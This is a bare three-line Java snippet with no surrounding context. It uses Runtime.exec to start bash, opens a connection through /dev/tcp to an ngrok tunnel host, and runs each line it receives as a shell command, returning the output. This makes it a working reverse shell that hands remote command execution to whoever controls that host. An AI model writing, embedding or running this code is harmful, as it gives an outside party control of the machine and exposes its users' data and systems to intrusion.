Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/a438-202-83-18-79.ngrok-free.app/443;cat <&5 | while read line; do $line 2>&5 >&5; done'");
p.waitFor();
